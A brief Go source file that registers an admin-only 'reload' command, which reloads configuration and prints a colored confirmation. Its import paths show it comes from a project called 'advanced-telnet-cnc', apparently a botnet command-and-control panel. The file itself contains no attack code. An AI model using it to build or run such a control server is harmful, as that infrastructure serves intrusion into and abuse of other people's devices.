package admin

import (
	"advanced-telnet-cnc/source/config"
	"advanced-telnet-cnc/source/master/command"
	sessions "advanced-telnet-cnc/source/master/session"
	"advanced-telnet-cnc/source/master/termfx"
)

func init() {
	command.Make(&command.Command{
		Aliases:     []string{"reload"},
		Description: "Reloads the configuration settings.",
		Admin:       true,
		Executor: func(args []string, fx *termfx.TermFX, session *sessions.Session) error {
			config.Serve()
			return session.Println("\x1b[92mSuccessfully reloaded all configs..")
		},
	})
}
